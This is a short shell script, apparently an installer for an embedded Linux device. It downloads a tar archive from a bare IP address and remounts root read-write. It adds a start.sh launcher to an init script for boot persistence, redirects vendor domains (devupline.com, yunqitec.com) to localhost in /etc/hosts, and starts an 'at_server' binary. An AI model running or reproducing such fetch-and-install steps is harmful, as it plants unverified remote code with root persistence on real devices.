#!/bin/sh
cd /home/root
mkdir html
wget http://60.246.90.240/jc09/jc09.tar -O jc09.tar
tar xvf jc09.tar
cd jc09
mount -o remount,rw /
if [ -z "$(cat /etc/init.d/hostname.sh|grep start.sh)" ];then
echo -e "\n/home/root/start.sh &\n" >> /etc/init.d/hostname.sh
fi
if [ -z "$(cat /etc/hosts|grep devupline)" ];then
echo "" >> /etc/hosts
echo "127.0.0.1 www.devupline.com" >> /etc/hosts
echo "127.0.0.1 devupline.com" >> /etc/hosts
echo "127.0.0.1 dm.yunqitec.com" >> /etc/hosts
echo "127.0.0.1 yunqitec.com" >> /etc/hosts
fi
cp start.sh /home/root/start.sh
cp at_server /home/root/at_server
cp -R html /home/root/
mount -o remount,ro /
cd /home/root
killall at_server
./at_server &
